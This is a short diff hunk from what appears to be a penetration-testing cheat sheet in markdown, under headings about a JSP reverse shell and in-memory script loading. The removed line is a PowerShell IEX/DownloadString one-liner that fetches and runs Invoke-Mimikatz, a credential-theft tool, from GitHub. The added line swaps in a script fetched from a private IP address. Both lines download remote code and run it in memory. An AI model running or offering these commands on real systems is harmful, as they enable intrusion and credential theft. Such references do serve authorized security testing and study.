@@ -91,7 +91,7 @@ Kali JSP Reverse Shell:
 ### <mark style="color:orange;">load script in memory</mark>
 
 ```
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1') ;
+IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/foo.ps1') ;
 ```
 
 ### <mark style="color:orange;">Proxy-aware Load in Memory with User Agent</mark>
